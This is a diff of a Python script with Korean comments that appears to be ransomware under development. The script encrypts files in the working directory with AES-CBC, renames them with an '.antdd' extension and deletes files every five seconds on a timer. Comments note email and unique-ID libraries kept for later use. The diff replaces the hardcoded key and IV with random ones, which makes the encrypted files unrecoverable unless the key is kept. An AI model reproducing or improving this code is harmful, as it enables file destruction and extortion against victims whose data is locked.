@@ -8,9 +8,12 @@ import glob
 import os
 import threading
 from time import sleep
+import binascii
 #나중에 쓰면 좋을 것 같은 라이브러리(이메일전송라이브러리, 고유식별자 부여 라이브러리)
 import smtplib
 import uuid
+
+iv = os.urandom(16)
 
 def list_files(path, ext=None):
     filelist=[]
@@ -26,6 +29,7 @@ def list_files(path, ext=None):
 
     print("filelist: \n", filelist)
     return filelist
+
 def startTimer():
     print("파일 삭제를 시작합니다")
     #5초에 한번씩 파일 삭제
@@ -67,6 +71,7 @@ def remove_files(path,ext=None):
 #            os.remove(remove_filelist[i])
 #        print("파일 중 절반이 삭제되었습니다.")
         print("더 이상 삭제할 파일이 없습니다")
+        exit(0)
     threading.Timer(5, remove_files, [os.getcwd()]).start()
 
 def enc(key, cipher, in_filename, out_filename=None):
@@ -79,7 +84,7 @@ def enc(key, cipher, in_filename, out_filename=None):
 
     print("---START ENCRYPTION : AES")
     mode = AES.MODE_CBC
-    iv = b'Sixteen byte iv3'
+    #iv = b'Sixteen byte iv3'
 
     # enc의 결과로 나오는 파일 이름을 정한다
     if not out_filename:
@@ -132,7 +137,7 @@ def dec( cipher, in_filename, out_filename):
     print("---START DECRYPTION : AES")
 
     mode = AES.MODE_CBC
-    iv = b'Sixteen byte iv3'
+    #iv = b'Sixteen byte iv3'
 
     if not out_filename:
         out_filename = os.path.splitext(in_filename)[0]
@@ -190,7 +195,7 @@ def dec( cipher, in_filename, out_filename):
 
 if __name__ == "__main__":
 
-    key = b'Sixteen byte key' #키 랜덤으로 생성해야한다.
+    key = os.urandom(16)
 
     #RSA : 키, 싸이퍼 생성
     random_generator = Random.new().read
@@ -227,14 +232,11 @@ if __name__ == "__main__":
         elif (menu == 2):
             dec_targetlist = list_files(os.getcwd(), '.antdd')
             print("dec_targetlist: \n", dec_targetlist)
-
             for dec_target in dec_targetlist:
                 #print(os.path.splitext(dec_target)[0])
                 #x = get_tmp(os.path.splitext(dec_target)[0])
-
                 print(dec_target.split('.')[0]+'.'+dec_target.split('.')[1])
                 #x = get_tmp(dec_target.split('.')[0]+'.'+dec_target.split('.')[1])
-
                 dec(cipher,dec_target, out_filename=None)  # x 없어야함
         elif (menu == 3):
             break
